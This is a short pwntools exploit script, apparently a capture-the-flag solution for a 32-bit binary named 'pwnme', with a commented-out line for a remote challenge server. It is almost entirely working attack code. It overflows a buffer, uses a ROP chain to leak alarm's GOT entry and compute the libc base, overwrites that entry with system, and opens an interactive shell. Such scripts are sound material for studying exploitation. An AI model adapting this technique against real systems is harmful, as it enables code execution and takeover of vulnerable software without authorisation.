from pwn import *

io = process("./pwnme")
#io = remote("202.120.7.145", 9991)
binary = ELF("./pwnme")
#libc = ELF("./libc-2.19.so")
libc = ELF("/usr/lib32/libc.so.6")

rop = ROP("./pwnme")

payload = "A"*20

rop.write(1, binary.got["alarm"], 4)
rop.read(0, binary.got["alarm"], 8)
rop.alarm(binary.got["__gmon_start__"])
print rop.dump()
payload += rop.chain()

io.readline()
io.readline()

io.sendline(payload)

data = io.read(4)
alarm = u32(data)

libc_base = alarm - libc.symbols["alarm"]
system = libc_base + libc.symbols["system"]
payload2 = p32(system) + "sh\x00\x00"

io.sendline(payload2)
io.interactive()
